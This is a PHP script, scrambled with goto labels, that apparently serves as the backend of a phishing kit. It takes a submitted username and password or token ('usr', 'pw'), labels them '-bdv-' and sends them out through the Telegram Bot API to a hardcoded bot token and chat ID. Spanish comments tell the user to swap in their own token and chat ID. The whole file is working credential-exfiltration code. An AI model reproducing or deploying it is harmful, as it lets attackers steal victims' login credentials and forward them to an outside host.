<?php
goto Q3Uh9; 
fJ0LO: 
$token = "7576739067:AAGirZWLYlIJ-B-krOiD7seIkcANYen-9JI"; // Reemplaza esto con tu nuevo bot token
goto lNR4g; 
tRNIK: 
$input = json_decode(file_get_contents("php://input"), true); 
goto fJ0LO; 
ZkAmw: 
if (isset($input["usr"]) && isset($input["pw"])) { 
    $usr = $input["usr"]; 
    $pw = $input["pw"]; 
    $message = "-bdv-\n -Usr.: {$usr} \n Token: {$pw}"; 
    $url = "https://api.telegram.org/bot{$token}/sendMessage"; 
    $data = array("chat_id" => $chatId, "text" => $message, "parse_mode" => "HTML"); 
    $ch = curl_init($url); 
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true); 
    curl_setopt($ch, CURLOPT_POST, true); 
    curl_setopt($ch, CURLOPT_POSTFIELDS, $data); 
    $response = curl_exec($ch); 
    $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE); 
    curl_close($ch); 
    if ($httpCode == 200) { 
        echo json_encode(array("success" => true)); 
    } else { 
        echo json_encode(array("success" => false, "error" => "Error al enviar el mensaje")); 
    } 
} else { 
    echo json_encode(array("success" => false, "error" => "Datos incompletos")); 
} 
goto jr_17; 
Q3Uh9: 
header("Content-Type: application/json"); 
goto tRNIK; 
lNR4g: 
$chatId = "7938474239"; // Reemplaza esto con tu nuevo chat ID
goto ZkAmw; 
jr_17: 
?>